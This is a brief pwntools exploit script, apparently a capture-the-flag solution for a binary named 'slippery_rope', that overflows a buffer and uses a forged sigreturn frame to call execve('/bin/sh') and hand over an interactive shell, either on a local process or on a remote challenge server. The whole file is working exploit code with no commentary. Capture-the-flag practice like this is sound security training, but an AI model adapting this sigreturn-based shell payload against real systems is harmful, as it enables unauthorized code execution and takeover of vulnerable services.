#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

POP_RAX_RET  = 0x4001b5
SYSCALL      = 0x4001b1
PADDING      = 208
SYS_EXECVE   = 0x3b
RT_SIGRETURN = 0xf
DATA_ADDR    = 0x6001cc
CMD          = b"/bin/sh\x00"

frame = SigreturnFrame()
frame.rax = SYS_EXECVE
frame.rdi = DATA_ADDR
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL
frame.rsp = DATA_ADDR & ~0xff
frame = bytes(frame)

payload = flat(
    CMD,
    b"A"*(PADDING - len(CMD)),
    p64(POP_RAX_RET),
    p64(RT_SIGRETURN),
    p64(SYSCALL),
    frame
)

if len(sys.argv) > 1:
    p = remote("pwn.hfz-1337.ninja", 1337)
else:
    p = process("./slippery_rope")

p.sendlineafter("> ", payload)
p.interactive()
